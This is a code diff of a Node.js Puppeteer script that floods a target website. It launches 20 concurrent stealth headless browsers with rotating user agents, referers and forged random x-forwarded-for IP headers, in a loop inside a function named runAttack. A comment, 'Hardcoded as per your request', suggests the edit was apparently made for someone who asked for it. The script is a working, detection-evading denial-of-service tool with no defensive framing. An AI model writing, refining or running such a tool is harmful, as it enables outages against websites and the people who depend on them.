@@ -8,55 +8,49 @@ puppeteer.use(StealthPlugin());
 const USER_AGENTS = fs.readFileSync('ua.txt', 'utf8')
     .split('\n')
     .map(line => line.trim())
-    .filter(line => line.length > 0);
+    .filter(line => line);
 
 const REFERERS = fs.readFileSync('refs.txt', 'utf8')
     .split('\n')
     .map(line => line.trim())
-    .filter(line => line.length > 0);
+    .filter(line => line);
 
-// Config
 const TARGET = process.argv[2] || 'https://example.com';
-const DURATION = parseInt(process.argv[3] || 60); // seconds
-const CONCURRENT_BROWSERS = parseInt(process.argv[4] || 10);
+const DURATION = parseInt(process.argv[3] || 60); // in seconds
+const CONCURRENT_BROWSERS = 20;  // Hardcoded as per your request
 
-// Random UA and Referer
-function getRandomUA() {
+function randomUA() {
     return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
 }
-function getRandomReferer() {
+
+function randomReferer() {
     return REFERERS[Math.floor(Math.random() * REFERERS.length)];
 }
 
 async function visitTarget(target) {
     const browser = await puppeteer.launch({
         headless: true,
-        args: [
-            '--no-sandbox',
-            '--disable-setuid-sandbox',
-            '--disable-dev-shm-usage',
-            '--disable-gpu',
-        ],
+        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage'],
         timeout: 15000
     });
 
     try {
         const page = await browser.newPage();
-        const ua = getRandomUA();
-        const ref = getRandomReferer();
+        const ua = randomUA();
+        const ref = randomReferer();
 
         await page.setUserAgent(ua);
         await page.setExtraHTTPHeaders({
             'referer': ref,
             'x-forwarded-for': Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.')
         });
-
         await page.setViewport({ width: 1280, height: 720 });
 
+        // Open the page and wait for it to load
         await page.goto(target, { waitUntil: 'networkidle2', timeout: 15000 });
-        await page.waitForTimeout(1500); // Keep tab open for 1.5s
+        await page.waitForTimeout(1500);  // Keep the tab open for 1.5s
     } catch (err) {
-        // ignore errors silently
+        console.error('Error with page load:', err);
     } finally {
         await browser.close();
     }
@@ -76,11 +70,11 @@ async function runAttack() {
         const tasks = [];
 
         for (let i = 0; i < CONCURRENT_BROWSERS; i++) {
-            tasks.push(
-                visitTarget(TARGET)
-                    .then(() => { total++; success++; })
-                    .catch(() => { total++; errors++; })
-            );
+            tasks.push(visitTarget(TARGET).then(() => {
+                total++; success++;
+            }).catch(() => {
+                total++; errors++;
+            }));
         }
 
         await Promise.allSettled(tasks);
